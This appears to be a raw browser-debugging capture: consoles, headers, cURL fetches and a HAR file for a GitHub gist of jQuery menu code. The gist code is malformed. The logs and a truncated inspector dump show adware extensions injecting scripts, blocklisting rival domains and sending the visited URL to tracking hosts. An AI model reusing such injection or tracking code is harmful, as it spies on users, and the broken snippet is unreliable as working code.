-My build of DIGITAL Command Language:
-Muhammad Adi Nugroho,S.Adm.Neg.:
-Via My Notepad++ (HTML Editor):
<body>
 <html>
 
  <script TYPE= "TEXT/JAVASCRIPT" src="https://gist.github.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30.js"></script>

   
			</html>	 
		 </body>	
		 -Via Google Chrome:
-Console:
var%20navLoadMenu%20=%20function()
/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee
index.php?name=EasySearch
mybrowserpages.com/json
8 requests ❘ 4.6 KB transferred ❘ Finish: 826 ms ❘ DOMContentLoaded: 354 ms ❘ Load: 353 ms

Console
Animations
Network conditions
Rendering
Search
Sensors





Preserve log
﻿
2016-07-22 01:15:17.389 var%20navLoadMenu%20=%20function():1 Refused to load the image 'https://gist.githubusercontent.com/favicon.ico' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.
2016-07-22 01:15:17.441
client?p=16&dist=261&sub=chrome208:847 Refused to load the script 'https://query.jollywallet.com/affiliate/jsquery2?dist=261&sub=chrome208&ver…72F8-7A3B-D9F64DEE3F3E&aff_ref=0&r=0.6103564553253726&width=320&height=547' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
tbView.loadjscssfile	@	client?p=16&dist=261&sub=chrome208:847
tbView.start	@	client?p=16&dist=261&sub=chrome208:1123
(anonymous function)	@	client?p=16&dist=261&sub=chrome208:1126
2016-07-22 01:15:17.675
info.js:128 Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "default-src 'none'". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
(anonymous function)	@	info.js:128
2016-07-22 01:15:17.675
info.js:129 Refused to evaluate a string as JavaScript because 'unsafe-eval' is not an allowed source of script in the following Content Security Policy directive: "default-src 'none'". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
(anonymous function)	@	info.js:129
2016-07-22 01:15:17.676
info.js:147 Refused to load the script 'https://serve.adsvmedia.com/build/sub19/av1990/av.js?cb=6306472298' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
(anonymous function)	@	info.js:147
(anonymous function)	@	info.js:150
2016-07-22 01:15:17.677
info.js:171 Refused to load the script 'https://asrvvv-a.akamaihd.net/get?addonname=[Enter%20Product%20Name]&client…31de4618bc3ed63e3787d8ec4c55ee%2Fvar%2520navLoadMenu%2520%3D%2520function()' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
(anonymous function)	@	info.js:171
(anonymous function)	@	info.js:172
﻿-Request Headers:
GET /alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function() HTTP/1.1
Host: gist.githubusercontent.com
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, sdch, br
Accept-Language: en-US,en;q=0.8,id;q=0.6
-Response Headers:
HTTP/1.1 200 OK
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'
Strict-Transport-Security: max-age=31536000
X-Content-Type-Options: nosniff
X-Frame-Options: deny
X-XSS-Protection: 1; mode=block
ETag: "86d10fb8e105f0b9d56837a6e3b5771e306d16ae"
Content-Type: text/plain; charset=utf-8
Cache-Control: max-age=300
X-Geo-Block-List: 
X-GitHub-Request-Id: 2BF94B18:11B1:3767EB:5791111D
Content-Length: 1065
Accept-Ranges: bytes
Date: Thu, 21 Jul 2016 18:15:16 GMT
Via: 1.1 varnish
Connection: keep-alive
X-Served-By: cache-sin6926-SIN
X-Cache: HIT
X-Cache-Hits: 1
Vary: Authorization,Accept-Encoding
Access-Control-Allow-Origin: *
X-Fastly-Request-ID: d4a031b193907d184322a3dd6c02e2ddd4197a6b
Expires: Thu, 21 Jul 2016 18:20:16 GMT
Source-Age: 23
-Response:
{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();
      
      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });
-cURL (cmd):
curl "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var"%"20navLoadMenu"%"20="%"20function()" -H "Accept-Encoding: gzip, deflate, sdch, br" -H "Accept-Language: en-US,en;q=0.8,id;q=0.6" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Cache-Control: max-age=0" -H "Connection: keep-alive" --compressed
-cURL (bash):
curl 'https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()' -H 'Accept-Encoding: gzip, deflate, sdch, br' -H 'Accept-Language: en-US,en;q=0.8,id;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Connection: keep-alive' --compressed
-Via GitBash:
Welcome to Git (version 1.9.4-preview20140611)


Run 'git help git' to display the help index.
Run 'git help <command>' to display help for specific commands.

Axioo@AXIOO-PC ~ (master|AM/REBASE)
$ curl "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7
d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var"%"20navLoadMenu"%"20="
%"20function()" -H "Accept-Encoding: gzip, deflate, sdch, br" -H "Accept-Langua
ge: en-US,en;q=0.8,id;q=0.6" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent:
Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTM
L, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36" -H "Accept: text/html,
application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Cache-Con
trol: max-age=0" -H "Connection: keep-alive" --compressed
{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();

      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });

Axioo@AXIOO-PC ~ (master|AM/REBASE)
$ curl 'https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7
d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20fu
nction()' -H 'Accept-Encoding: gzip, deflate, sdch, br' -H 'Accept-Language: en
-US,en;q=0.8,id;q=0.6' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozill
a/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, lik
e Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36' -H 'Accept: text/html,applic
ation/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Cache-Control:
max-age=0' -H 'Connection: keep-alive' --compressed
{
      $.ajax({
          url: 'https://cdn.detik.net.id/libs/dc/v1/menu.js',
          jsonp: true,var navLoadMenu = function()
          jsonpCallback:'dtkmenu',
          dataType: "jsonp",
          success: function( response ) {
              $('#drop_kanal').append(response[0] );
              $('.drop_kanal .menu_k').css('height',$( window ).height()*0.8);
          }
      });
  }
  $('#ico_detik').click(function(){
      if (! $('#drop_kanal').find('.menu_k').length)
          navLoadMenu();

      if($( "#ico_detik" ).hasClass( "active" )){
          $("#drop_kanal").fadeOut(200);
          $(".ico_detik").removeClass("active");
      }
      else {
          $("#drop_kanal").fadeIn(200);
          $(".ico_detik").addClass("active");
      }
  });
  $('#fm_user').click(function(){
      if($( "#fm_user" ).hasClass( "active" )){
          $("#drop_users").fadeOut(200);
          $(".fm_user").removeClass("active");
      }
      else {
          $("#drop_users").fadeIn(200);
          $(".fm_user").addClass("active");
      }
  });

Axioo@AXIOO-PC ~ (master|AM/REBASE)
$
-HAR:
{
  "log": {
    "version": "1.2",
    "creator": {
      "name": "WebInspector",
      "version": "537.36"
    },
    "pages": [
      {
        "startedDateTime": "2016-07-21T18:15:16.852Z",
        "id": "page_1",
        "title": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()",
        "pageTimings": {
          "onContentLoad": 353.62399999939953,
          "onLoad": 353.371999999581
        }
      }
    ],
    "entries": [
      {
        "startedDateTime": "2016-07-21T18:15:16.852Z",
        "time": 105.86599999987811,
        "request": {
          "method": "GET",
          "url": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate, sdch, br"
            },
            {
              "name": "Host",
              "value": "gist.githubusercontent.com"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.8,id;q=0.6"
            },
            {
              "name": "Upgrade-Insecure-Requests",
              "value": "1"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
            },
            {
              "name": "Accept",
              "value": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
            },
            {
              "name": "Cache-Control",
              "value": "max-age=0"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": 571,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "X-Fastly-Request-ID",
              "value": "d4a031b193907d184322a3dd6c02e2ddd4197a6b"
            },
            {
              "name": "Content-Security-Policy",
              "value": "default-src 'none'; style-src 'unsafe-inline'"
            },
            {
              "name": "Via",
              "value": "1.1 varnish"
            },
            {
              "name": "X-Content-Type-Options",
              "value": "nosniff"
            },
            {
              "name": "X-Geo-Block-List",
              "value": ""
            },
            {
              "name": "X-Cache",
              "value": "HIT"
            },
            {
              "name": "X-Cache-Hits",
              "value": "1"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Vary",
              "value": "Authorization,Accept-Encoding"
            },
            {
              "name": "Content-Length",
              "value": "1065"
            },
            {
              "name": "ETag",
              "value": "\"86d10fb8e105f0b9d56837a6e3b5771e306d16ae\""
            },
            {
              "name": "X-Served-By",
              "value": "cache-sin6926-SIN"
            },
            {
              "name": "X-GitHub-Request-Id",
              "value": "2BF94B18:11B1:3767EB:5791111D"
            },
            {
              "name": "Date",
              "value": "Thu, 21 Jul 2016 18:15:16 GMT"
            },
            {
              "name": "Source-Age",
              "value": "23"
            },
            {
              "name": "X-Frame-Options",
              "value": "deny"
            },
            {
              "name": "Strict-Transport-Security",
              "value": "max-age=31536000"
            },
            {
              "name": "Content-Type",
              "value": "text/plain; charset=utf-8"
            },
            {
              "name": "Access-Control-Allow-Origin",
              "value": "*"
            },
            {
              "name": "X-XSS-Protection",
              "value": "1; mode=block"
            },
            {
              "name": "Cache-Control",
              "value": "max-age=300"
            },
            {
              "name": "Accept-Ranges",
              "value": "bytes"
            },
            {
              "name": "Expires",
              "value": "Thu, 21 Jul 2016 18:20:16 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "size": 1065,
            "mimeType": "text/plain",
            "compression": 1
          },
          "redirectURL": "",
          "headersSize": 790,
          "bodySize": 1064,
          "_transferSize": 1854
        },
        "cache": {},
        "timings": {
          "blocked": 1.02199999855657,
          "dns": -1,
          "connect": -1,
          "send": 0.5760000003647301,
          "wait": 101.0590000005327,
          "receive": 3.209000000424112,
          "ssl": -1
        },
        "serverIPAddress": "151.101.100.133",
        "connection": "16697",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:16.986Z",
        "time": 260.36199999907694,
        "request": {
          "method": "POST",
          "url": "https://mybrowserpages.com/json/index.php?name=EasySearch",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Origin",
              "value": "https://gist.githubusercontent.com"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate, br"
            },
            {
              "name": "Host",
              "value": "mybrowserpages.com"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.8,id;q=0.6"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
            },
            {
              "name": "Accept",
              "value": "*/*"
            },
            {
              "name": "Referer",
              "value": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Content-Length",
              "value": "0"
            },
            {
              "name": "Cache-Control",
              "value": "max-age=0"
            }
          ],
          "queryString": [
            {
              "name": "name",
              "value": "EasySearch"
            }
          ],
          "cookies": [],
          "headersSize": 596,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Date",
              "value": "Thu, 21 Jul 2016 18:11:00 GMT"
            },
            {
              "name": "Content-Encoding",
              "value": "gzip"
            },
            {
              "name": "Vary",
              "value": "Accept-Encoding"
            },
            {
              "name": "Server",
              "value": "nginx"
            },
            {
              "name": "X-Powered-By",
              "value": "PHP/5.3.29"
            },
            {
              "name": "Transfer-Encoding",
              "value": "chunked"
            },
            {
              "name": "Content-Type",
              "value": "text/html"
            },
            {
              "name": "Access-Control-Allow-Origin",
              "value": "*"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            }
          ],
          "cookies": [],
          "content": {
            "size": 62,
            "mimeType": "text/html",
            "compression": -31
          },
          "redirectURL": "",
          "headersSize": 253,
          "bodySize": 93,
          "_transferSize": 346
        },
        "cache": {},
        "timings": {
          "blocked": 1.33300000015879,
          "dns": -1,
          "connect": -1,
          "send": 0.49399999988964005,
          "wait": 256.9170000006126,
          "receive": 1.6179999984159394,
          "ssl": -1
        },
        "serverIPAddress": "146.0.226.234",
        "connection": "16692",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.247Z",
        "time": 0,
        "request": {
          "method": "GET",
          "url": "https://api.jollywallet.com/affiliate/client?p=16&dist=261&sub=chrome208",
          "httpVersion": "unknown",
          "headers": [
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
            }
          ],
          "queryString": [
            {
              "name": "p",
              "value": "16"
            },
            {
              "name": "dist",
              "value": "261"
            },
            {
              "name": "sub",
              "value": "chrome208"
            }
          ],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "unknown",
          "headers": [
            {
              "name": "Date",
              "value": "Thu, 21 Jul 2016 18:14:54 GMT"
            },
            {
              "name": "Content-Encoding",
              "value": "gzip"
            },
            {
              "name": "Server",
              "value": "nginx/1.4.7"
            },
            {
              "name": "P3P",
              "value": "policyref=\"/w3c/p3p.xml\", CP=\"CURa ADMa DEVa OUR IND DSP CAO COR\""
            },
            {
              "name": "X-Powered-By",
              "value": "PHP/5.4.42"
            },
            {
              "name": "Content-Type",
              "value": "application/javascript"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Content-Length",
              "value": "12311"
            },
            {
              "name": "Expires",
              "value": "Mon, 25 Jul 2016 18:14:54 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "size": 43438,
            "mimeType": "application/javascript"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": 0,
          "_transferSize": 0
        },
        "cache": {},
        "timings": {
          "blocked": -1,
          "dns": -1,
          "connect": -1,
          "send": 0,
          "wait": 0,
          "receive": 0,
          "ssl": -1
        },
        "serverIPAddress": "52.7.247.223",
        "connection": "16695",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.390Z",
        "time": 0,
        "request": {
          "method": "GET",
          "url": "https://gist.githubusercontent.com/favicon.ico",
          "httpVersion": "unknown",
          "headers": [],
          "queryString": [],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 0,
          "statusText": "",
          "httpVersion": "unknown",
          "headers": [],
          "cookies": [],
          "content": {
            "size": 0,
            "mimeType": "x-unknown"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1,
          "_transferSize": 0,
          "_error": ""
        },
        "cache": {},
        "timings": {
          "blocked": -1,
          "dns": -1,
          "connect": -1,
          "send": 0,
          "wait": 0,
          "receive": 0,
          "ssl": -1
        },
        "serverIPAddress": "",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.401Z",
        "time": 270.7769999997254,
        "request": {
          "method": "GET",
          "url": "https://mybrowserpages.com/extension/EasySearch/info.js",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Accept",
              "value": "*/*"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Accept-Encoding",
              "value": "gzip, deflate, sdch, br"
            },
            {
              "name": "Referer",
              "value": "https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function()"
            },
            {
              "name": "Host",
              "value": "mybrowserpages.com"
            },
            {
              "name": "Accept-Language",
              "value": "en-US,en;q=0.8,id;q=0.6"
            },
            {
              "name": "User-Agent",
              "value": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36"
            }
          ],
          "queryString": [],
          "cookies": [],
          "headersSize": 510,
          "bodySize": 0
        },
        "response": {
          "status": 200,
          "statusText": "OK",
          "httpVersion": "HTTP/1.1",
          "headers": [
            {
              "name": "Date",
              "value": "Thu, 21 Jul 2016 18:11:01 GMT"
            },
            {
              "name": "Content-Encoding",
              "value": "gzip"
            },
            {
              "name": "Last-Modified",
              "value": "Mon, 27 Jun 2016 04:11:19 GMT"
            },
            {
              "name": "Server",
              "value": "nginx"
            },
            {
              "name": "ETag",
              "value": "W/\"5770a767-1db4\""
            },
            {
              "name": "Vary",
              "value": "Accept-Encoding"
            },
            {
              "name": "Content-Type",
              "value": "application/javascript"
            },
            {
              "name": "Cache-Control",
              "value": "max-age=43200"
            },
            {
              "name": "Transfer-Encoding",
              "value": "chunked"
            },
            {
              "name": "Connection",
              "value": "keep-alive"
            },
            {
              "name": "Expires",
              "value": "Fri, 22 Jul 2016 06:11:01 GMT"
            }
          ],
          "cookies": [],
          "content": {
            "size": 7604,
            "mimeType": "application/javascript",
            "compression": 5436
          },
          "redirectURL": "",
          "headersSize": 349,
          "bodySize": 2168,
          "_transferSize": 2517
        },
        "cache": {},
        "timings": {
          "blocked": 1.44599999839556,
          "dns": -1,
          "connect": -1,
          "send": 0.4730000000563499,
          "wait": 258.8730000006761,
          "receive": 9.985000000597381,
          "ssl": -1
        },
        "serverIPAddress": "146.0.226.234",
        "connection": "16692",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.441Z",
        "time": 0,
        "request": {
          "method": "GET",
          "url": "https://query.jollywallet.com/affiliate/jsquery2?dist=261&sub=chrome208&ver=1&p=16&token=3631710C-037A-72F8-7A3B-D9F64DEE3F3E&aff_ref=0&r=0.6103564553253726&width=320&height=547",
          "httpVersion": "unknown",
          "headers": [],
          "queryString": [
            {
              "name": "dist",
              "value": "261"
            },
            {
              "name": "sub",
              "value": "chrome208"
            },
            {
              "name": "ver",
              "value": "1"
            },
            {
              "name": "p",
              "value": "16"
            },
            {
              "name": "token",
              "value": "3631710C-037A-72F8-7A3B-D9F64DEE3F3E"
            },
            {
              "name": "aff_ref",
              "value": "0"
            },
            {
              "name": "r",
              "value": "0.6103564553253726"
            },
            {
              "name": "width",
              "value": "320"
            },
            {
              "name": "height",
              "value": "547"
            }
          ],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 0,
          "statusText": "",
          "httpVersion": "unknown",
          "headers": [],
          "cookies": [],
          "content": {
            "size": 0,
            "mimeType": "x-unknown"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1,
          "_transferSize": 0,
          "_error": ""
        },
        "cache": {},
        "timings": {
          "blocked": -1,
          "dns": -1,
          "connect": -1,
          "send": 0,
          "wait": 0,
          "receive": 0,
          "ssl": -1
        },
        "serverIPAddress": "",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.676Z",
        "time": 0,
        "request": {
          "method": "GET",
          "url": "https://serve.adsvmedia.com/build/sub19/av1990/av.js?cb=6306472298",
          "httpVersion": "unknown",
          "headers": [],
          "queryString": [
            {
              "name": "cb",
              "value": "6306472298"
            }
          ],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 0,
          "statusText": "",
          "httpVersion": "unknown",
          "headers": [],
          "cookies": [],
          "content": {
            "size": 0,
            "mimeType": "x-unknown"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1,
          "_transferSize": 0,
          "_error": ""
        },
        "cache": {},
        "timings": {
          "blocked": -1,
          "dns": -1,
          "connect": -1,
          "send": 0,
          "wait": 0,
          "receive": 0,
          "ssl": -1
        },
        "serverIPAddress": "",
        "pageref": "page_1"
      },
      {
        "startedDateTime": "2016-07-21T18:15:17.678Z",
        "time": 0,
        "request": {
          "method": "GET",
          "url": "https://asrvvv-a.akamaihd.net/get?addonname=[Enter%20Product%20Name]&clientuid=[Enter%20Client%20UID]&subID=&affid=9657&subaffid=1004&href=https%3A%2F%2Fgist.githubusercontent.com%2Falph4delta%2Fa86fad124e0be9ebbefd4f7c7d661c30%2Fraw%2Ff52f18f08231de4618bc3ed63e3787d8ec4c55ee%2Fvar%2520navLoadMenu%2520%3D%2520function()",
          "httpVersion": "unknown",
          "headers": [],
          "queryString": [
            {
              "name": "addonname",
              "value": "[Enter%20Product%20Name]"
            },
            {
              "name": "clientuid",
              "value": "[Enter%20Client%20UID]"
            },
            {
              "name": "subID",
              "value": ""
            },
            {
              "name": "affid",
              "value": "9657"
            },
            {
              "name": "subaffid",
              "value": "1004"
            },
            {
              "name": "href",
              "value": "https%3A%2F%2Fgist.githubusercontent.com%2Falph4delta%2Fa86fad124e0be9ebbefd4f7c7d661c30%2Fraw%2Ff52f18f08231de4618bc3ed63e3787d8ec4c55ee%2Fvar%2520navLoadMenu%2520%3D%2520function()"
            }
          ],
          "cookies": [],
          "headersSize": -1,
          "bodySize": 0
        },
        "response": {
          "status": 0,
          "statusText": "",
          "httpVersion": "unknown",
          "headers": [],
          "cookies": [],
          "content": {
            "size": 0,
            "mimeType": "x-unknown"
          },
          "redirectURL": "",
          "headersSize": -1,
          "bodySize": -1,
          "_transferSize": 0,
          "_error": ""
        },
        "cache": {},
        "timings": {
          "blocked": -1,
          "dns": -1,
          "connect": -1,
          "send": 0,
          "wait": 0,
          "receive": 0,
          "ssl": -1
        },
        "serverIPAddress": "",
        "pageref": "page_1"
      }
    ]
  }
}
-Via Mozilla Firefox:
-Console:
GET 
https://gist.githubusercontent.com/alph4delta/a86fad124e0be9ebbefd4f7c7d661c30/raw/f52f18f08231de4618bc3ed63e3787d8ec4c55ee/var%20navLoadMenu%20=%20function() [HTTP/1.1 304 Not Modified 70ms]
Content Security Policy: The page's settings blocked the loading of a resource at self ("default-src 'none'"). var%20navLoadMenu%20=%20function():1:0
Content Security Policy: The page's settings blocked the loading of a resource at self ("default-src 'none'"). bg.js:1:0
Content Security Policy: The page's settings blocked the loading of a resource at https://shinypage.com/module/spcs.js ("default-src 'none'"). (unknown)
Content Security Policy: The page's settings blocked the loading of a resource at https://discoveryapp-a.akamaihd.net/stats/?ITRAN_1=Discovery%20App|,|Browser|,|true|,|Firefox|,|47|,|ff00e8f5-fd84-47ea-8752-0158f49a8aa8 ("default-src 'none'"). (unknown)
Content Security Policy: The page's settings blocked the loading of a resource at https://discoveryapp-a.akamaihd.net/DiscoveryApp/cr ("default-src 'none'"). (unknown)
Content Security Policy: The page's settings blocked the loading of a resource at self ("default-src 'none'"). RemoteAddonsParent.jsm:896:0
Content Security Policy: The page's settings blocked the loading of a resource at https://discoveryapp-a.akamaihd.net/stats/?POV_3=Discovery%20App|,|Browser|,|true|,|Firefox|,|47|,|ff00e8f5-fd84-47ea-8752-0158f49a8aa8|,|873c9300-9ab8-4362-81e8-3f3fe828183d|,|1469125469872|,||,||,|https%3A%2F%2Fgist.githubusercontent.com%2Falph4delta%2Fa86fad124e0be9ebbefd4f7c7d661c30%2Fraw%2Ff52f18f08231de4618bc3ed63e3787d8ec4c55ee%2Fvar%2520navLoadMenu%2520%3D%2520function()|,||,|ID|,|142|,|199|,||,||,||,|isippub1id|,|1|,|1 ("default-src 'none'"). (unknown)
Content Security Policy: The page's settings blocked the loading of a resource at self ("default-src 'none'"). RemoteAddonsParent.jsm:834:0
-Inspector:
Outer HTML:
<html><head><link rel="alternate stylesheet" type="text/css" href="resource://gre-resources/plaintext.css" title="Wrap Long Lines"><script type="text/javascript">window.__blackListUrls__ = ['(?:.*.)?smartshopping.com','(?:.*.)?shoppstop.com','(?:.*.)?localmoxie.com','(?:.*.)?mail.com','(?:.*.)?yellowmoxie.com','(?:.*.)?internetproper.com', '(?:.*.)?traveleist.com','(?:.*.)?financetopix.com','(?:.*.)?ideallhealth.com','(?:.*.)?search2discover.com','(?:.*.)?variablesearch.com','(?:.*.)?efix.com','(?:.*.)?reimage-express.com','(?:.*.)?anti-toolbar.com','(?:.*.)?supersupport.com','(?:.*.)?reimageplus.com','(?:.*.)?reimage.com','(?:.*.)?crossrider.com','(?:.*.)?bi.crossrider.com', '(?:.*.)?softonic.com', '(?:.*.)?mackeeper.com', '(?:.*.)?pckeeper.com', '(?:.*.)?kromtech.com','(?:.*.)?plusnetwork.com'];</script><script type="text/javascript">window.__checkIfUrlIsValid__ = function(url){try {for (var i = 0; i < window.__blackListUrls__.length; i++){ if (window.__blackListUrls__[i] === url){return false;}else{var regex = new RegExp(window.__blackListUrls__[i], 'g');var res = url.match(regex);if (res){return false;}}}return true;} catch(e) {return true;}}</script><script type="text/javascript">window.__checkIfPCUrl__ = function () {function checkUrl(urlsArr) {for (var i = 0; i < urlsArr.length; i++){if (location.href.indexOf(urlsArr[i]) >= 0) {return true;}}return false;}var full = ['securedshopgate.com','pcutilitiespro.com','pcrepairlabs.com','superpctools.com','viracure.com'];var sub = ['pcutilitiespro', 'viracure', 'superpctools', 'pcrepairlabs'];var file = 